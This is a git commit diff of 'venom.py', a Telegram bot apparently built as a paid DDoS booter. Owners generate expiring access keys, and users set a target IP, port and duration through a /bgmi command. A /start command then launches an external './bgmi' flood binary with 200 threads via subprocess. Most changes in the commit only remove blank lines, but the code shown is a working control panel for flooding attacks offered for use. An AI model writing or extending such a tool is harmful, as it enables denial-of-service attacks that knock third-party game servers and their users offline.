f1a2cd5e351e936fc198e9cec677669d3334d7f0
SaurabhDevil59 <saurabhlungare100@gmail.com>
2024-07-22 14:20:48 +0530

    Update venom.py

--- venom.py
+++ venom.py
@@ -1,46 +1,24 @@
 import subprocess
-
 import json
-
 import os
-
 import random
-
 import string
-
 import datetime
-
 from telegram import Update
-
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
-
 from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
 
 
 
 KEY_FILE = "keys.json"
 
-
-
 flooding_process = None
 
 flooding_command = None
 
-
-
-
-
 DEFAULT_THREADS = 200
 
-
-
-
-
 keys = {}
-
-
-
-
 
 def load_data():
 
@@ -48,37 +26,20 @@ def load_data():
 
     keys = load_keys()
 
-
-
-
-
 def load_keys():
-
     try:
-
         with open(KEY_FILE, "r") as file:
-
             return json.load(file)
-
     except FileNotFoundError:
-
         return {}
-
     except Exception as e:
-
         print(f"Error loading keys: {e}")
-
         return {}
-
-
-
 def save_keys():
 
     with open(KEY_FILE, "w") as file:
 
         json.dump(keys, file)
-
-
 
 def generate_key(length=6):
 
@@ -86,13 +47,9 @@ def generate_key(length=6):
 
     return ''.join(random.choice(characters) for _ in range(length))
 
-
-
 def add_time_to_current_date(hours=0, days=0):
 
     return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
-
-
 
 # Command to generate keys
 
@@ -110,44 +67,22 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 time_amount = int(command[0])
 
                 time_unit = command[1].lower()
-
-            
                 if time_unit == 'days':
-
                     expiration_date = add_time_to_current_date(days=time_amount)
-
                 else:
-
                     raise ValueError("Invalid time unit")
-
                 key = generate_key()
-
                 keys[key] = expiration_date
-
                 save_keys()
-
                 response = f"Key generated: {key}\nExpires on: {expiration_date}"
-
             except ValueError:
-
                 response = f"Please specify a valid number and unit of time (hours/days) script by OWNER- @{OWNER_USERNAME}..."
-
         else:
 
             response = "Usage: /genkey <amount> <hours/days>"
-
     else:
-
         response = f"ONLY OWNER CAN USE💀OWNER OWNER- @{OWNER_USERNAME}..."
-
-
-
     await update.message.reply_text(response)
-
-
-
-
-
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     user_id = str(6197634543)
@@ -179,10 +114,6 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     await update.message.reply_text(response)
 
-
-
-
-
 async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     user_id = str(6197634543)
@@ -207,17 +138,11 @@ async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     await update.message.reply_text(response)
 
-
-
-
-
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     global flooding_command
 
     user_id = str(6197634543)
-
-
 
     if len(context.args) != 3:
 
@@ -225,23 +150,15 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
         return
 
-
-
     target_ip = context.args[0]
 
     port = context.args[1]
 
     duration = context.args[2]
 
-
-
     flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
 
     await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')
-
-
-
-
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
@@ -249,17 +166,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     user_id = str(6197634543)
 
-
-
-
-
     if flooding_process is not None:
 
         await update.message.reply_text('Flooding is already running.')
 
         return
-
-
 
     if flooding_command is None:
 
@@ -267,25 +178,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
         return
 
-
-
     flooding_process = subprocess.Popen(flooding_command)
 
     await update.message.reply_text('Started flooding.')
-
-
-
-
-
+    
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     global flooding_process
 
     user_id = str(6197634543)
-
-
-
-
 
     if flooding_process is None:
 
@@ -293,17 +194,11 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
         return
 
-
-
     flooding_process.terminate()
 
     flooding_process = None
 
     await update.message.reply_text('Stopped flooding.')
-
-
-
-
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
@@ -334,7 +229,6 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     await update.message.reply_text(response)
 
 
-
 def main() -> None:
 
     application = ApplicationBuilder().token(BOT_TOKEN).build()
@@ -353,8 +247,6 @@ def main() -> None:
 
     application.add_handler(CommandHandler("stop", stop))
 
-    application.add_handler(CommandHandler("broadcast", broadcast))
-
     application.add_handler(CommandHandler("help", help_command))
 
 
@@ -368,3 +260,4 @@ def main() -> None:
 if __name__ == '__main__':
 
     main()
+#saurabh lungare
